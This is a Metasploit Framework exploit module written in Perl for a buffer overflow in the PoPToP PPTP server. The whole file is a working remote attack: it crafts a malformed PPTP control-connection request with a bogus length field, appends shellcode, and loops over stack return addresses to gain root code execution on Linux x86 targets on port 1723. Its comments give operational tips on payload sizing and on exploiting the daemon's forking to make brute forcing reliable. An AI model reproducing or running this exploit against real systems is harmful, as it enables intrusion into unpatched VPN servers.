package Msf::Exploit::PoPToP_Negative_Read;
use strict;
use base 'Msf::Exploit';

my $advanced = {
  'StackTop'    => ['0xbffffa00', 'Start address for stack ret bruteforcing.'],
  'StackBottom' => ['0xbffff000', 'End address for stack ret bruteforcing.'],
  'StackStep'   => [0, 'Step size for ret bruteforcing, 0 for auto calculation.'],
  'BruteWait'   => [.4, 'Length in seconds to wait between brute force attempts'],
    # calculated at 228,  fudge to make more universal
  'PreRetLength'   => [220, 'Space before the we start writing return address.  Note: this + ExtraSpace is how much space we have for the payload.'],
  'RetLength'      => [32, 'Length of rets after payload'],
  'ExtraSpace'  => [0, "The exploit builds two protocol frames, the header frame and the control frame. ExtraSpace allows you use this space for the payload instead of the protocol (breaking the protocol, but still triggering the bug). If this value is <= 128, it doesn't really disobey the protocol, it just uses the Vendor and Hostname fields for payload data (these should eventually be filled in to look like a real client, ie windows).  I've had successful exploitation with this set to 154, but nothing over 128 is suggested."],
};

my $info = {
  'Name'    => 'PoPToP Negative Read Overflow',
  'Version' => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'linux' ],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 1723],
    },
  'Payload' =>
    {
      'Space'     => 0, # We override this to do it dynamically
      'BadChars'  => '', # Eh, we don't have any
      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 16,
    },
  'Description'  =>  
        'PoPToP Negative Read Buffer Overflow affecting '.
        'versions prior to 1.1.4-b3 and 1.1.3-20030409. '.
        'The daemon forks, so we can hit as many times as '.
        'we need to (And allowing very accurate brute forcing. '.
        'However, you can only hold 4 concurrent '.
        'processes or you won\'t hit anyore '.
        'until you free one. It does a fork() and then exec() so '.
        'so the stack should be pretty similar each attempt.'.
        'Note: Right now the vector we take does a close(sock) right before '.
        'we gain control, so you can\'t findsock.  There should be a way '.
        'to take a more complicated vector and avoid the close.',
  'Refs'  =>
    [
      'http://www.osvdb.org/displayvuln.php?osvdb_id=3293',
      'http://securityfocus.com/archive/1/317995',
      'http://www.freewebs.com/blightninjas/',
    ],
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

#  $self->SetLocal('ExtraSpace', 128) if($self->GetLocal('ExtraSpace') > 128);

  return($self);
}

# Override the PayloadSpace method
sub PayloadSpace {
  my $self = shift;
  return($self->GetLocal('PreRetLength') + $self->GetLocal('ExtraSpace'));
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  # struct pptp_header {
  #   u_int16_t length;               /* pptp message length incl header */
  #   u_int16_t pptp_type;            /* pptp message type */
  #   u_int32_t magic;                /* magic cookie */
  #   u_int16_t ctrl_type;            /* control message type */
  #   u_int16_t reserved0;            /* reserved */
  # };
  my $headerPayload =
    "\x00\x01" . # Length (1) ;)
    "\x00\x01" . # PPTP Type (PPTP_CTRL_MESSAGE -> 1)
    #fixme this should be randomized, along with a lot of the other values.
    "\x1a\x2b\x3c\x4d" . # No more no less, that's a magic number (0x1a2b3c4d)
    "\x00\x01" . # Ctrl Type (START_CTRL_CONN_RQST -> 1)
    "\x00\x00";  # Reserved (0)

  $self->PrintDebugLine(1, "ExtraSpace: " . $self->GetLocal('ExtraSpace'));

  # MAX_HOSTNAME_SIZE  64
  # MAX_VENDOR_SIZE    64
  # struct pptp_start_ctrl_conn_rqst {
  #   struct pptp_header header;      /* pptp header */
  #   u_int16_t version;              /* pptp protocol version */
  #   u_int16_t reserved1;            /* reserved */
  #   u_int32_t framing_cap;          /* framing capabilities */
  #   u_int32_t bearer_cap;           /* bearer capabilities */
  #   u_int16_t max_channels;         /* maximum channels */
  #   u_int16_t firmware_rev;         /* firmware revision */
  #   u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */
  #   u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */
  # };
  my $ctrlPayload =
    "\x01\x00" . # Version (1.0)
    "\x00\x00" . # Reserved (0)
    "\x00\x00\x00\x00" . # Framing Cap (0)
    "\x00\x00\x00\x00" . # Bearer Cap (0)
    "\x00\x01" . # Max Channels (1)
    "\x00\x01" . # Firmware Rev (1)
    Pex::Utils::PadBuffer('drawesome', 64) . # Hostname
    Pex::Utils::PadBuffer('drawesome', 64);  # Vendor

  my $pptpPayload = $headerPayload . $ctrlPayload;

  substr($pptpPayload, -1 * $self->GetLocal('ExtraSpace'), $self->GetLocal('ExtraSpace'), '');


  my $retLength = $self->GetLocal('RetLength');
  my $bruteWait = $self->GetLocal('BruteWait');
  my $stackTop = hex($self->GetLocal('StackTop'));
  my $stackBottom = hex($self->GetLocal('StackBottom'));

  my $stackStep = $self->GetLocal('StackStep');
  $stackStep = $encodedPayload->NopsLength if($stackStep == 0);
  $stackStep -= $stackStep % 4;

  for(my $ret = $stackTop; $ret >= $stackBottom; $ret -= $stackStep) {
    my $sock = Msf::Socket->new();
    if(!$sock->Tcp($targetHost, $targetPort) || $sock->IsError) {
      $sock->PrintError;
      return;
    }

    $self->PrintLine(sprintf("Trying %#08x", $ret));

    if(!$sock->Send($pptpPayload . $shellcode . (pack('V', $ret) x int($retLength / 4)))) {
      $self->PrintLine('Error in send.');
      $sock->PrintError;
    }
#    $sock->Send('foo');
    $sock->Close;
    select(undef, undef, undef, $bruteWait); # ghetto sleep
  }
  exit(0);
}

1;
